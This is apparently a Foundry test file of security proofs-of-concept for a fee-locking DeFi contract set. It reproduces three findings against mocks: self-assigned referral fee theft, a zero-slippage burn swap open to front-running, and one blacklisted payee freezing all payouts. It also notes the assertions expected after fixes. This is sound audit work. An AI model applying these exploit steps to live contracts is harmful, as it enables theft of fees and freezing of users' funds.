// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {CrucibleLock} from "../src/CrucibleLock.sol";
import {Crucible} from "../src/Crucible.sol";
import {ReferralRegistry} from "../src/ReferralRegistry.sol";
import {MockERC20, MockSwapRouter, MockNFPM} from "./mocks/Mocks.sol";

/// ============================================================================
/// SECURITY PROOF-OF-CONCEPTS — these tests PASS today, and that is the problem.
///
/// Each test asserts the CURRENT, exploitable behaviour of the contracts so the
/// issue is reproducible rather than described. They are not fixes and they are
/// not a regression suite yet.
///
/// WHEN A FIX LANDS, THE MATCHING TEST WILL FAIL. That is the signal the fix
/// worked. Invert it at that point — each test documents the assertion that
/// should replace it under "AFTER THE FIX".
///
/// Green CI on this file does NOT mean the contracts are safe. It means the
/// exploits still reproduce.
///
///   1. test_PoC_anyoneCanSelfAssignReferrerLeg  — referral leg is open to anyone
///   2. test_PoC_projectBurnAcceptsAnyOutput     — swaps run with amountOutMinimum = 0
///   3. test_PoC_oneBlockedRecipientFreezesEveryone — one blocked payee bricks the position
/// ============================================================================
contract ReviewPoCTest is Test {
    CrucibleLock internal locker;
    Crucible internal crucible;
    ReferralRegistry internal registry;
    MockERC20 internal usdc;
    MockERC20 internal launch;
    MockSwapRouter internal router;
    MockNFPM internal nfpm;

    address internal platform = makeAddr("platform");
    address internal creator = makeAddr("creator");
    address internal attacker = makeAddr("attacker");
    address internal dead = 0x000000000000000000000000000000000000dEaD;

    uint256 internal constant TOKEN_ID = 7;

    function setUp() public {
        usdc = new MockERC20("USD Coin", "USDC", 6);
        launch = new MockERC20("MEME", "MEME", 18);
        router = new MockSwapRouter();
        nfpm = new MockNFPM();
        registry = new ReferralRegistry();
        crucible = new Crucible(address(usdc), address(router), 10_000);
        locker = new CrucibleLock(
            address(nfpm), address(usdc), address(router), address(crucible), address(registry), platform
        );
        nfpm.mint(TOKEN_ID, address(this), address(usdc), address(launch), 10_000);
        nfpm.approve(address(locker), TOKEN_ID);
        locker.lock(TOKEN_ID, creator, CrucibleLock.Kind.Meme, address(0));
        launch.mint(address(router), 1_000_000e18);
    }

    function _seedFees(uint256 usdcFee) internal {
        usdc.mint(address(nfpm), usdcFee);
        nfpm.setOwed(TOKEN_ID, uint128(usdcFee), 0);
    }

    /// FINDING: any wallet can self-register as a referral payout, then claim the 500 bps
    /// referrer leg on ANY position it did not refer, simply by naming itself at collect time.
    function test_PoC_anyoneCanSelfAssignReferrerLeg() public {
        // Attacker registers a code nobody has taken. Permissionless, no approval, no cost.
        vm.prank(attacker);
        registry.register("totally-unrelated", attacker);

        _seedFees(10_000e6);

        // Attacker collects someone else's position, naming itself as the referrer.
        vm.prank(attacker);
        locker.collectFees(TOKEN_ID, attacker);

        // 500 bps of the whole fee lands in a wallet that referred nobody.
        assertEq(usdc.balanceOf(attacker), 500e6, "attacker captured the referrer leg");
        emit log_named_decimal_uint("attacker took (USDC)", usdc.balanceOf(attacker), 6);
        // AFTER THE FIX: the attacker should receive 0 and the 500 bps should fold into
        // Crucible, since this caller referred nobody:
        //   assertEq(usdc.balanceOf(attacker), 0);
    }

    /// FINDING: the project-burn swap is executed with amountOutMinimum = 0, and collectFees is
    /// permissionless, so the caller fully controls when that unprotected swap runs. Modelled here
    /// by a router whose rate collapses -- the burn still executes and still reports "success".
    function test_PoC_projectBurnAcceptsAnyOutput() public {
        _seedFees(10_000e6);

        // Simulate a manipulated pool: the caller front-ran the burn, so the rate collapsed.
        router.setOutPerIn(1); // effectively worthless output per USDC in

        vm.prank(attacker);
        locker.collectFees(TOKEN_ID);

        // 1000 bps of USDC was spent buying the launch token. Essentially nothing reached dead.
        // 1,000 USDC of project-burn budget bought 1000 wei of an 18-decimal token.
        assertEq(launch.balanceOf(dead), 1000, "burn produced dust for 1,000 USDC of input");
        emit log_named_uint("launch tokens actually burned (wei)", launch.balanceOf(dead));
        // AFTER THE FIX: a collapsed rate must revert rather than silently burning dust:
        //   vm.expectRevert();
        //   locker.collectFees(TOKEN_ID);
    }

    /// FINDING: a single blacklisted recipient bricks the entire collect path for the position,
    /// freezing every other party's share too. Arc USDC is Circle FiatTokenV2 and has a real
    /// blacklist, so this is reachable without any bug in this contract.
    function test_PoC_oneBlockedRecipientFreezesEveryone() public {
        BlockingERC20 bUsdc = new BlockingERC20();
        MockNFPM n2 = new MockNFPM();
        Crucible c2 = new Crucible(address(bUsdc), address(router), 10_000);
        CrucibleLock l2 = new CrucibleLock(
            address(n2), address(bUsdc), address(router), address(c2), address(registry), platform
        );
        n2.mint(TOKEN_ID, address(this), address(bUsdc), address(launch), 10_000);
        n2.approve(address(l2), TOKEN_ID);
        l2.lock(TOKEN_ID, creator, CrucibleLock.Kind.Meme, address(0));

        bUsdc.mint(address(n2), 10_000e6);
        n2.setOwed(TOKEN_ID, uint128(10_000e6), 0);

        bUsdc.setBlocked(creator, true); // issuer blacklists the creator wallet

        vm.expectRevert(); // TransferFailed -- the whole collect path is dead
        l2.collectFees(TOKEN_ID);

        assertEq(bUsdc.balanceOf(platform), 0, "platform leg frozen by an unrelated party");
        assertEq(bUsdc.balanceOf(address(c2)), 0, "crucible leg frozen too");
        // AFTER THE FIX: collection should succeed and pay everyone else, with the blocked
        // creator's share accrued for later withdrawal instead of reverting the whole call:
        //   l2.collectFees(TOKEN_ID);
        //   assertEq(bUsdc.balanceOf(platform), 1_000e6);
    }
}

/// Minimal USDC-alike with a Circle-style blacklist.
contract BlockingERC20 {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public blocked;

    function setBlocked(address who, bool v) external { blocked[who] = v; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(!blocked[to] && !blocked[msg.sender], "BLACKLISTED");
        require(balanceOf[msg.sender] >= amount, "BAL");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address f, address to, uint256 amount) external returns (bool) {
        require(!blocked[to] && !blocked[f], "BLACKLISTED");
        uint256 a = allowance[f][msg.sender];
        require(a >= amount, "ALLOW");
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amount;
        require(balanceOf[f] >= amount, "BAL");
        balanceOf[f] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}
